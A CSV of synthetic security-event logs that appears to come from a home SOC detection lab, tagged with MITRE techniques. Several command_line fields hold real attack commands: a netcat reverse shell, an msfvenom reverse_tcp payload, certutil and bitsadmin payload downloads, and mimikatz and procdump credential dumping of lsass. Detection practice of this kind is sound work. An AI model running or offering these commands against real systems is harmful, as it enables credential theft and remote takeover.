access_type,action,action_taken,agent_ip,agent_name,attachment,attacker_host,attempt_count,bytes_sent,bytes_transferred,cloud_provider,command,command_line,destination_domain,destination_host,destination_ip,destination_port,dns_query,encryption_type,event_code,event_type,failure_reason,file_hash,file_path,files_affected,host,image,indicator,injection_type,lab_attack,lab_note,log_source,login_location_1,login_location_2,logon_type,malware_name,mitre_technique,parent_process,ports_scanned,privileges_assigned,process,process_id,protocol,query_count,query_type,recipient,registry_key,resource,rule_name,scan_type,sender,service_name,severity,signature,signature_id,signed,source_host,source_ip,source_process,subject,target_ip,target_process,time_difference_minutes,timestamp,tool,user,value,wazuh_rule_desc,wazuh_rule_id
,,,,,,,216,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T09:51:37.662419,Hydra,ubuntu,,,
,BLOCK,,,,,,,,,,,,,,172.16.0.100,445,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-SSH-External,,,,Low,,,,,185.220.101.45,,,,,,2026-04-21T15:37:37.668314,,,,,
0x1010,,,,,,,,,,,,,,,,,,,10,Credential Dumping,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon Event ID 10,,,,,T1003.001,,,,procdump.exe,,,,,,,,,,,,Critical,,,,,,,,,lsass.exe,,2026-04-21T01:54:37.667209,,lab.administrator,,,
,,,,,,,,,,,,mimikatz.exe lsadump::sam,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,procdump.exe,4032,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T03:06:37.663340,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,SPLUNK-VM-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-20T21:28:37.660067,,attacker,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,FIN-SERVER-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.101,,,,,,2026-04-24T08:17:37.660966,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,DEV-SERVER-01,,,,,,Windows Security,,,2,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.105,,,,,,2026-04-22T07:54:37.660844,,temp.analyst,,,
,,,10.0.2.10,WAZUH-MANAGER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-21T15:25:37.669361,,,,Multiple failed SSH logins,31101
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Bad Password,,,,KALI-LAB-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,10.0.2.10,,,,,,2026-04-23T02:33:37.659839,,lab.administrator,,,
,,,,,,,271,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T21:41:37.662241,Hydra / CrackMapExec,john.doe,,,
,,,,,,,,,,Okta,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,United States,Russia,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,19,2026-04-21T20:04:37.668076,,attacker,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-PRAHARSH-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.15,,,,,,2026-04-20T22:22:37.660984,,finance.user,,,
,BLOCK,,,,,,,,,,,,,,172.16.0.100,22,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-Kali-Attacker,,,,Low,,,,,23.129.64.100,,,,,,2026-04-19T19:15:37.668409,,,,,
,,,,,,,,7785396,,,,,mimikatz-payload[.]ru,,192.168.56.104,8080,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-19T15:17:37.666199,,,,,
,,,,,,,,,,,,,,,,,,,4672,Privilege Escalation,,,,,DEV-SERVER-01,,,,True,,Windows Security,,,,,T1068,,,SeRestorePrivilege,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-23T08:03:37.665331,,svc.backup,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.10,4444,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,TCP,,,,,,Block-SSH-External,,,,Low,,,,,23.129.64.100,,,,,,2026-04-23T03:38:37.668373,,,,,
,BLOCK,,,,,,,,,,,,,,10.0.2.15,23,,,,Firewall Block,,,,,,,,,,,Firewall / UFW,,,,,,,,,,,UDP,,,,,,Block-C2-Ports,,,,Low,,,,,192.168.56.104,,,,,,2026-04-23T08:07:37.668398,,,,,
,,Cleaned,,,,,,,,,,,,,,,,,,Malware Detected,,5f4dcc3b5aa765d61d8327deb882cf99,C:\Users\Public\malware.exe,,SPLUNK-VM-01,,,,,,Windows Defender / Wazuh,,,,Meterpreter,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T19:22:37.667307,,,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,WIN-DC-PRAHARSH,,,APC Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,regsvr32.exe,,,lsass.exe,,2026-04-24T13:46:37.667569,,,,,
,,,,,,KALI-LAB-01,166,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T09:58:37.661602,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,SPLUNK-VM-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,ELK-SERVER-01,172.16.0.100,,,,,,2026-04-21T22:55:37.665424,,svc.backup,,,
,AttachAdminPolicy,,,,,,,,,GCP,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,iam:user/temp.analyst,,,,,High,,,,,,,,,,,2026-04-23T14:26:37.667917,,temp.analyst,,,
,,,,,,,,,,,,bitsadmin /transfer job /download /priority normal http://192.168.56.104/shell.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,mshta.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T09:47:37.664904,,svc.backup,,,
,,,10.0.2.15,WIN-PRAHARSH-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-21T06:35:37.669352,,,,Rootkit detection attempt,5712
,,,,,,,197,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T14:30:37.662570,Hydra,splunk,,,
,AttachAdminPolicy,,,,,,,,,GCP,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,iam:user/temp.analyst,,,,,High,,,,,,,,,,,2026-04-19T23:54:37.667819,,temp.analyst,,,
,,,,,,,,,,,,,,,185.220.101.45,1337,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,regsvr32.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-21T00:01:37.663426,,attacker,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,48658,FIN-SERVER-01,,Volume shadow service stopped,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T23:05:37.667790,,,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,ELK-SERVER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T13:43:37.664655,,jane.smith,,,
,,,,,,,222,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-24T09:09:37.661755,Hydra / CrackMapExec,temp.analyst,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,29501,WIN-PRAHARSH-01,,Volume shadow service stopped,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T10:26:37.667732,,,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,23.129.64.100,,,,,,2026-04-19T19:28:37.659603,,temp.analyst,,,
,,,,,reset_password.html,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,john.doe@praharsh-lab.local,,,,,ceo@company-update[.]net,,High,,,,,,,Invoice #12345 Attached,,,,2026-04-22T15:52:37.669153,,,,,
,CreateAccessKey,,,,,,,,,AWS,,,,,,,,,,Cloud IAM Change,,,,,,,,,,,CloudTrail / Azure AD,,,,,T1098,,,,,,,,,,,s3:bucket/sensitive-data,,,,,High,,,,,,,,,,,2026-04-23T15:10:37.667984,,temp.analyst,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,5f4dcc3b5aa765d61d8327deb882cf99,C:\Users\praharsh.admin\Downloads\invoice.exe,,WIN-DC-PRAHARSH,,,,,,Windows Defender / Wazuh,,,,Mimikatz,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T19:24:37.667300,,,,,
,,,,,,,186,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T08:02:37.662233,Hydra / CrackMapExec,lab.administrator,,,
,,,,,,,,,,,,,,,45.67.22.10,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,ET TROJAN Metasploit Meterpreter,2405945,,,10.0.2.15,,,,,,2026-04-20T15:20:37.669002,,,,,
,,,,,,,,,,,,procdump.exe -ma lsass.exe lsass.dmp,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,procdump.exe,1657,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T20:19:37.663275,,praharsh.admin,,,
,,,,,,,,,,,powershell -nop -w hidden -c IEX,,,,,,,,4104,PowerShell Execution,,,,,WAZUH-MANAGER-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T09:07:37.664594,,svc.splunk,,,
,,,,,,,,,,,,msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444,,,192.168.56.104,4444,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T21:09:37.664404,Metasploit / Netcat,jane.smith,,,
,,,,,,,,,,,,,,,23.129.64.100,4444,,,3,Sysmon Network Connection,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1071.001,,,,certutil.exe,,,,,,,,,,,,High,,,,,192.168.56.105,,,,,,2026-04-20T06:26:37.663693,,john.doe,,,
,,,,,,,,,,,powershell Invoke-Mimikatz,,,,,,,,4104,PowerShell Execution,,,,,KALI-LAB-01,,,,,,Windows PowerShell,,,,,T1059.001,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T06:14:37.664576,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\ProgramData\malware.bat,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,regsvr32.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-22T05:45:37.663973,,svc.splunk,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-PRAHARSH-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,172.16.0.100,,,,,,2026-04-23T08:50:37.661034,,attacker,,,
,,,,,,,,,98010127,,,,,,77.73.133.84,,,,,Data Exfiltration Suspected,,,,,WIN-DC-PRAHARSH,,,,,,Firewall,,,,,T1048,,,,,,HTTPS,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T09:46:37.666942,,john.doe,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T08:15:37.663028,,attacker,,,
,,,,,,,189,,,,,,,,,22,,,,SSH Brute Force,,,,,SPLUNK-VM-01,,,,True,,Linux Auth,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-19T21:55:37.662537,Hydra,splunk,,,
,,,,,,,,2025064,,,,,phish-praharsh-lab[.]xyz,,23.129.64.100,8080,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T13:56:37.666215,,,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,15025,,,,,,,,,,,UDP Scan,,,Medium,,,,,192.168.56.104,,,192.168.56.101,,,2026-04-21T03:21:37.665220,Nmap,,,,
,,,,,,,,,,,,,,,,,,,11,Sysmon File Create,,,C:\Windows\Temp\payload.exe,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1105,,,,powershell.exe,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-24T01:07:37.663834,,svc.splunk,,,
,,,192.168.56.103,WIN-DC-PRAHARSH,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-23T19:03:37.669532,,,,Multiple failed SSH logins,40101
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,32022,FIN-SERVER-01,,Volume shadow service stopped,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T00:00:37.667702,,,,,
,,Blocked,,,,,,,,,,,,,,,,,,Malware Detected,,5f4dcc3b5aa765d61d8327deb882cf99,C:\Users\Public\malware.exe,,FIN-SERVER-01,,,,,,Windows Defender / Wazuh,,,,Emotet,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-23T21:55:37.667518,,,,,
,,,,,,,,,,,,,,DEV-SERVER-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-24T14:20:37.665836,,dev.engineer,,,
,,,192.168.56.103,SPLUNK-VM-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T15:09:37.669466,,,,File integrity monitoring alert,100002
,,,,,,,,,,,,,,WIN-PRAHARSH-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-20T23:12:37.665789,,attacker,,,
,,,,,,,,1205623,,,,,data-exfil[.]io,,194.165.16.11,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T00:09:37.666395,,,,,
,,,,,,KALI-LAB-01,196,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-22T13:54:37.661624,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,10,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.105,,,,,,2026-04-23T21:09:37.659987,,jane.smith,,,
,,,,,,,,,,,,mimikatz.exe lsadump::sam,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,mimikatz.exe,6693,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-21T15:08:37.663284,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.102,,,,,,2026-04-20T09:56:37.660429,,lab.administrator,,,
,,,,,,,,,,,,,,,,,,0x17,4769,Kerberos TGS Request,,,,,WIN-DC-PRAHARSH,,,,,,Windows Security,,,,,T1558.003,,,,,,,,,,,,,,,svc.sql,High,,,,,,,,,,,2026-04-20T08:52:37.662733,,attacker,,,
,,,10.0.2.15,WIN-DC-PRAHARSH,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,Medium,,,,,,,,,,,2026-04-21T05:05:37.669308,,,,File integrity monitoring alert,31101
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,WIN-PRAHARSH-01,,,,,,Windows Security,,,3,,,,,,,,,,,,,,,,,,Info,,,,,10.0.2.10,,,,,,2026-04-23T20:22:37.661065,,svc.backup,,,
,,,,,,,,,,,,,,FIN-SERVER-01,,,,,4624,RDP Login,,,,,,,,,,,Windows Security,,,10,,T1021.001,,,,,,,,,,,,,,,,Medium,,,,WIN-DC-PRAHARSH,192.168.56.102,,,,,,2026-04-23T02:12:37.665447,,attacker,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Disabled,,,,FIN-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,2,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.103,,,,,,2026-04-20T21:05:37.660305,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T12:17:37.662885,,attacker,,,
,,,,,,,,,,,,mimikatz.exe sekurlsa::logonpasswords,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,procdump.exe,5052,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T06:24:37.663386,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,YmFzZTY0.data-exfil[.]io,,,DNS Tunneling Detected,,,,,WIN-PRAHARSH-01,,,,,,DNS / Zeek,,,,,T1071.004,,,,,,,795,TXT,,,,,,,,Critical,,,,,,,,,,,2026-04-20T22:58:37.666644,,,,,
,,,,,,,,,,,,,,,,,,,,Port Scan Detected,,,,,,,,,True,,Firewall / IDS,,,,,T1046,,62996,,,,,,,,,,,OS Detection,,,Medium,,,,,192.168.56.104,,,192.168.56.105,,,2026-04-21T03:54:37.665169,Nmap,,,,
,,,,,reset_password.html,,,,,,,,,,,,,,,Phishing Email,,,,,,,,,,,Email Gateway,,,,,T1566.001,,,,,,,,,svc.splunk@praharsh-lab.local,,,,,ceo@company-update[.]net,,High,,,,,,,Urgent Password Reset Required,,,,2026-04-22T23:55:37.669177,,,,,
,,,,,,,,,,,,,,ELK-SERVER-01,,,,,7045,PsExec Detected,,,,,,,,,,,Sysmon,,,,,T1570,,,,,,,,,,,,,,,PSEXESVC,High,,,,WIN-PRAHARSH-01,,,,,,,2026-04-22T18:20:37.665884,,svc.splunk,,,
,,,,,,,,,,,,,,,23.129.64.100,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,Critical,ET TROJAN Metasploit Meterpreter,2140737,,,192.168.56.103,,,,,,2026-04-22T17:50:37.668818,,,,,
,,,,,,,,832614,,,,,phish-praharsh-lab[.]xyz,,91.234.56.78,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T02:10:37.666319,,,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Windows\Temp\malicious.dll,,,,,Sysmon,,,,,T1055.001,,,,mshta.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-21T12:01:37.663758,,,,,
,,,,,,,,,,,,,,,,,,,4625,Password Spray,,,,,WIN-DC-PRAHARSH,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T00:59:37.663163,,john.doe,,,
,,,,,,,,,,,,cmd.exe /c nc.exe 192.168.56.104 4444 -e cmd.exe,,,192.168.56.104,9001,,,1,Reverse Shell Detected,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1059.001,,,,,,,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-21T23:07:37.664368,Metasploit / Netcat,john.doe,,,
,,,,,,,221,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-23T09:13:37.661742,Hydra / CrackMapExec,john.doe,,,
,,,192.168.56.105,FIN-SERVER-01,,,,,,,,,,,,,,,,Wazuh Alert,,,,,,,,,,,Wazuh Manager,,,,,,,,,,,,,,,,,,,,,High,,,,,,,,,,,2026-04-22T16:12:37.669542,,,,Multiple failed SSH logins,100002
,,,,,,,254,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-21T22:09:37.662173,Hydra / CrackMapExec,john.doe,,,
,,,,,,KALI-LAB-01,232,,,,,,,,192.168.56.105,,,,4625,Brute Force Attempt,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.001,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T07:40:37.661620,Hydra,lab.administrator,,,
,,,,,,,,,,,,,,,,,,,4625,Failed Login,Account Locked,,,,DEV-SERVER-01,,,,,Simulated brute-force noise,Windows Security,,,3,,T1078,,,,,,,,,,,,,,,,Medium,,,,,192.168.56.103,,,,,,2026-04-19T16:49:37.660163,,attacker,,,
,,,,,,,,,,,,,,,,,,,13,Sysmon Registry Set,,,,,WIN-PRAHARSH-01,,,,,,Sysmon,,,,,T1547.001,,,,bitsadmin.exe,,,,,,HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run,,,,,,High,,,,,,,,,,,2026-04-24T09:12:37.664082,,,powershell -enc AAAA,,
,,,,,,,,5914358,,,,,evil-c2[.]com,,194.165.16.11,8080,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,HTTPS,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-22T06:16:37.666330,,,,,
,,,,,,,,,,,,,,,,,,,,Ransomware Activity,,,,18863,KALI-LAB-01,,Mass file encryption detected,,,,Sysmon / EDR,,,,,T1486,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-22T04:46:37.667737,,,,,
,,,,,,,,,,,,,,,,,,,7,Sysmon Image Load,,,,,WIN-PRAHARSH-01,C:\Windows\Temp\malicious.dll,,,,,Sysmon,,,,,T1055.001,,,,msiexec.exe,,,,,,,,,,,,High,,,False,,,,,,,,2026-04-23T11:20:37.663801,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,KALI-LAB-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.103,,,,,,2026-04-24T04:59:37.660786,,praharsh.admin,,,
,,,,,,,,,,,,,,,,,,,8,Process Injection,,,,,WIN-DC-PRAHARSH,,,APC Injection,,,Sysmon Event ID 8,,,,,T1055,,,,,,,,,,,,,,,,Critical,,,,,,powershell.exe,,,lsass.exe,,2026-04-24T06:23:37.667549,,,,,
,,,,,,,,4270740,,,,,cobalt-beacon[.]onion,,23.129.64.100,1337,,,,C2 Outbound Connection,,,,,WIN-PRAHARSH-01,,,,True,,Firewall / Sysmon,,,,,T1071.001,,,,,,TCP,,,,,,,,,,Critical,,,,,192.168.56.105,,,,,,2026-04-20T07:43:37.666243,,,,,
,,,,,,,,,,,,,,,,,,,4624,Successful Login,,,,,DEV-SERVER-01,,,,,,Windows Security,,,10,,,,,,,,,,,,,,,,,,Info,,,,,192.168.56.101,,,,,,2026-04-23T05:09:37.661039,,praharsh.admin,,,
,,,,,,,,,,,,certutil -urlcache -split -f http://192.168.56.104/mal.exe C:\Windows\Temp\mal.exe,,,,,,,1,LOLBIN Execution,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1218,,,,mshta.exe,,,,,,,,,,,,High,,,,,,,,,,,2026-04-20T08:14:37.664864,,jane.smith,,,
,,,,,,,45,,,,,,,,,3389,,,4625,RDP Brute Force,,,,,WIN-PRAHARSH-01,,,,True,,Windows Security,,,,,T1110.003,,,,,,,,,,,,,,,,High,,,,,192.168.56.104,,,,,,2026-04-20T13:20:37.662292,Hydra / CrackMapExec,attacker,,,
,,,,,,,,,,Azure AD,,,,,,,,,,Impossible Travel,,,,,,,,,,,Azure AD / Okta,United States,Russia,,,T1078.004,,,,,,,,,,,,,,,,High,,,,,,,,,,16,2026-04-24T00:08:37.668045,,jane.smith,,,
,,,,,,,,,,,,,,,194.165.16.11,,,,,IDS Alert,,,,,,,,,,,Suricata / Snort,,,,,,,,,,,,,,,,,,,,,High,ET EXPLOIT CVE-2021-44228 Log4j,2595125,,,172.16.0.100,,,,,,2026-04-21T16:00:37.668969,,,,,
,,,,,,,,,,,,mimikatz.exe lsadump::sam,,,,,,,1,Sysmon Process Create,,,,,WIN-PRAHARSH-01,,,,True,,Sysmon,,,,,T1003.001,cmd.exe,,,meterpreter.exe,1127,,,,,,,,,,,Critical,,,,,,,,,,,2026-04-20T15:49:37.663391,,praharsh.admin,,,
